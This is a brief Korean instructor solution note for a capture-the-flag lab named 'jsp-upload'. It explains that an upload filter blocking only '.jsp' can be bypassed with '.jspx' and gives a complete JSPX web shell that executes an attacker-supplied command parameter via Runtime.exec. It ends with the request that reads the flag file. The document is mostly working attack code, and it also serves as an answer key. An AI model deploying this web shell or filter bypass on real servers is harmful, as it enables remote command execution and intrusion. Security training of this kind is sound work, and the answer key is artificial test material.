# [강사용] jsp-upload
`.jsp` 만 차단 → `.jspx` 로 우회. 웹쉘(shell.jspx, JSP document 문법):
```xml
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("c")).getInputStream();
  byte[] b = new byte[in.available()]; in.read(b); out.println(new String(b));
</jsp:scriptlet>
</jsp:root>
```
업로드 후 `uploads/shell.jspx?c=cat /flag` → flag.
